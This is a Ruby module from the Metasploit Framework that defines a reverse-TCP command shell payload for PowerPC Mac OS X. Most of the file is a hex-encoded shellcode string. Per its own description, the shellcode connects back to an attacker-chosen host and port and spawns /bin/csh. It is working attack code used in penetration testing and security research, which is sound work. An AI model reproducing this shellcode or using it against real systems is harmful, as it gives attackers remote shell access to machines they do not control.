##
# $Id: shell_reverse_tcp.rb 5033 2007-07-06 01:22:54Z ramon $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Osx
module Ppc

module ShellReverseTcp

	include Msf::Payload::Single
	include Msf::Payload::Osx

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OSX Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision: 5033 $',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_PPC,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LPORT'    => [ 34, 'n'    ],
							'LHOST'    => [ 36, 'ADDR' ],
						},
					'Payload' =>			
						"\x38\x60\x00\x02\x38\x80\x00\x01\x38\xa0\x00\x06\x38\x00" +
						"\x00\x61\x44\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78" +
						"\x48\x00\x00\x0d\x00\x02\x22\x11\x7f\x00\x00\x01\x7c\x88" +
						"\x02\xa6\x38\xa0\x00\x10\x38\x00\x00\x62\x7f\xc3\xf3\x78" +
						"\x44\x00\x00\x02\x7c\x00\x02\x78\x38\xa0\x00\x02\x38\x00" +
						"\x00\x5a\x7f\xc3\xf3\x78\x7c\xa4\x2b\x78\x44\x00\x00\x02" +
						"\x7c\x00\x02\x78\x38\xa5\xff\xff\x2c\x05\xff\xff\x40\x82" +
						"\xff\xe5\x38\x00\x00\x42\x44\x00\x00\x02\x7c\x00\x02\x78" +
						"\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7c\x68\x02\xa6\x38\x63" +
						"\x00\x20\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8" +
						"\x38\x00\x00\x3b\x7c\x00\x04\xac\x44\x00\x00\x02\x2f\x62" +
						"\x69\x6e\x2f\x63\x73\x68\x00\x41\x41\x41"
				}
			))
	end

end

end end end end end
